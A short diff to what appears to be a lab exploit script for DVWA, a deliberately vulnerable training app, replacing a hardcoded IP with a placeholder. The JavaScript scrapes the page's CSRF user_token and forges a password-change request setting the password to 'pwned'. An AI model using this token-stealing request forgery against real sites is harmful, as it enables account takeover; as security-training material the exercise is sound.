@@ -1,5 +1,5 @@
 
-var theUrl = 'http://34.133.46.89:9090/vulnerabilities/csrf/';
+var theUrl = 'http://{DVWA-IPADDRESS}/vulnerabilities/csrf/';
 var pass = 'pwned';
 if (window.XMLHttpRequest){
     xmlhttp=new XMLHttpRequest();
@@ -15,7 +15,7 @@ xmlhttp.onreadystatechange=function(){
         var regex = /user_token\' value\=\'(.*?)\' \/\>/;
         var match = text.match(regex);
         var token = match[1];
-        var new_url = 'http://34.133.46.89:9090/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='>
+        var new_url = 'http://{DVWA-IPADDRESS}/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='>
         if(!hacked){
             alert('Got token:' + match[1]);
             hacked = true;
